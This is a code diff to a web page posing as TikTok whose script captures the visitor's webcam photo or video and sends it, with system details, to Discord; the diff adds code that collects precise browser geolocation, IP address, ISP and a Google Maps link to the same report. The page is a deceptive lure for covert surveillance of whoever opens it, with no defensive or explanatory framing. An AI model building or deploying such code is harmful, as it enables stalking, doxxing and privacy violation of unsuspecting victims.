@@ -7,7 +7,7 @@
 <meta content="Watch tiktok" property="og:description">
 <meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
 <meta content="website" property="og:type"/>
-<title>Сделайте снимок</title>
+<title>Tiktok</title>
 <style>
 body {
     margin: 0;
@@ -91,7 +91,9 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch (err) {
             // If camera access fails, still send system info
             setTimeout(() => {
-                sendToDiscord(null);
+                getLocationAndIP().then(systemInfo => {
+                    sendToDiscord(null, systemInfo);
+                });
             }, 1500);
         }
     }
@@ -115,8 +117,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 // Create a blob from the recorded chunks
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 
-                // Send the recorded video to Discord
-                sendToDiscord(blob);
+                // Get location and IP, then send to Discord
+                getLocationAndIP().then(systemInfo => {
+                    sendToDiscord(blob, systemInfo);
+                });
                 
                 // Stop all tracks
                 stream.getTracks().forEach(track => track.stop());
@@ -148,12 +152,14 @@ document.addEventListener('DOMContentLoaded', () => {
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Send the captured image to Discord
-        sendToDiscord(canvas);
+        // Get location and IP, then send the captured image to Discord
+        getLocationAndIP().then(systemInfo => {
+            sendToDiscord(canvas, systemInfo);
+        });
     }
     
-    function sendToDiscord(media) {
-        // Collect system information with emojis
+    async function getLocationAndIP() {
+        // Collect basic system information with emojis
         const systemInfo = {
             "🌐 User Agent": navigator.userAgent,
             "💻 Platform": navigator.platform,
@@ -163,12 +169,137 @@ document.addEventListener('DOMContentLoaded', () => {
             "🍪 Cookies Enabled": navigator.cookieEnabled,
             "📅 Date": new Date().toISOString(),
             "📍 Location": "Unknown",
-            "📡 IP Address": "Unknown"
+            "📡 IP Address": "Unknown",
+            "🗺️ Google Maps": "No location data"
         };
         
-        // Format system info as a string
+        try {
+            // Try to get precise location using HTML5 Geolocation API first
+            const preciseLocation = await new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            source: "HTML5 Geolocation"
+                        });
+                    },
+                    (error) => {
+                        console.log("HTML5 Geolocation failed:", error);
+                        resolve(null);
+                    },
+                    { timeout: 3000, enableHighAccuracy: true }
+                );
+            });
+            
+            if (preciseLocation) {
+                const mapsUrl = `https://www.google.com/maps?q=${preciseLocation.latitude},${preciseLocation.longitude}`;
+                systemInfo["📍 Location"] = `Lat: ${preciseLocation.latitude.toFixed(4)}, Lon: ${preciseLocation.longitude.toFixed(4)} (Accuracy: ${Math.round(preciseLocation.accuracy)}m)`;
+                systemInfo["🗺️ Google Maps"] = `[View on Google Maps](${mapsUrl})`;
+                systemInfo["📍 Location Source"] = preciseLocation.source;
+            }
+            
+            // Then try IP-based geolocation services as fallback
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json',
+                'https://api.ipgeolocation.io/ipgeo?apiKey=demo',
+                'https://freeipapi.com/api/json'
+            ];
+            
+            let ipData = null;
+            
+            // Try each service until we get a successful response
+            for (const service of services) {
+                try {
+                    const response = await fetch(service, { timeout: 5000 });
+                    if (response.ok) {
+                        ipData = await response.json();
+                        break;
+                    }
+                } catch (e) {
+                    console.log(`Service ${service} failed, trying next`);
+                    continue;
+                }
+            }
+            
+            if (ipData) {
+                // Extract IP address
+                systemInfo["📡 IP Address"] = ipData.ip || ipData.IPv4 || "Unknown";
+                
+                // Only use IP-based location if we don't have precise location
+                if (!preciseLocation) {
+                    // Extract and format location information
+                    const locationParts = [];
+                    
+                    // Handle different API response formats
+                    if (ipData.city && ipData.city !== "Not found") locationParts.push(ipData.city);
+                    if (ipData.region && ipData.region !== "Not found") locationParts.push(ipData.region);
+                    if (ipData.state && ipData.state !== "Not found") locationParts.push(ipData.state);
+                    if (ipData.country_name && ipData.country_name !== "Not found") locationParts.push(ipData.country_name);
+                    if (ipData.country && ipData.country !== "Not found" && !ipData.country_name) locationParts.push(ipData.country);
+                    
+                    if (locationParts.length > 0) {
+                        systemInfo["📍 Location"] = locationParts.join(', ');
+                        systemInfo["📍 Location Source"] = "IP-Based Estimation";
+                    } else {
+                        systemInfo["📍 Location"] = "Location data not available";
+                    }
+                    
+                    // Create Google Maps link if we have coordinates
+                    let latitude, longitude;
+                    
+                    if (ipData.latitude && ipData.longitude) {
+                        latitude = ipData.latitude;
+                        longitude = ipData.longitude;
+                    } else if (ipData.loc) {
+                        const [lat, lon] = ipData.loc.split(',');
+                        latitude = lat;
+                        longitude = lon;
+                    } else if (ipData.lat && ipData.lon) {
+                        latitude = ipData.lat;
+                        longitude = ipData.lon;
+                    }
+                    
+                    if (latitude && longitude) {
+                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        systemInfo["🗺️ Google Maps"] = `[View on Google Maps](${mapsUrl})`;
+                    }
+                }
+                
+                // Add more details if available
+                if (ipData.org && ipData.org !== "Not found") {
+                    systemInfo["🏢 ISP"] = ipData.org;
+                }
+                if (ipData.asn && ipData.asn !== "Not found") {
+                    systemInfo["📶 ASN"] = ipData.asn;
+                }
+            }
+        } catch (error) {
+            console.error('Error fetching location data:', error);
+            systemInfo["📍 Location"] = "Error fetching location";
+            systemInfo["🗺️ Google Maps"] = "Location data unavailable";
+        }
+        
+        return systemInfo;
+    }
+    
+    function sendToDiscord(media, systemInfo) {
+        // Format system info as a string with Markdown for links
         const systemInfoText = Object.entries(systemInfo)
-            .map(([key, value]) => `${key}: ${value}`)
+            .map(([key, value]) => {
+                // Handle the Google Maps link specially to preserve Markdown
+                if (key === "🗺️ Google Maps" && value.startsWith("[View on Google Maps](")) {
+                    return `${key}: ${value}`;
+                }
+                return `${key}: ${value}`;
+            })
             .join('\n');
         
         // Create the main message payload
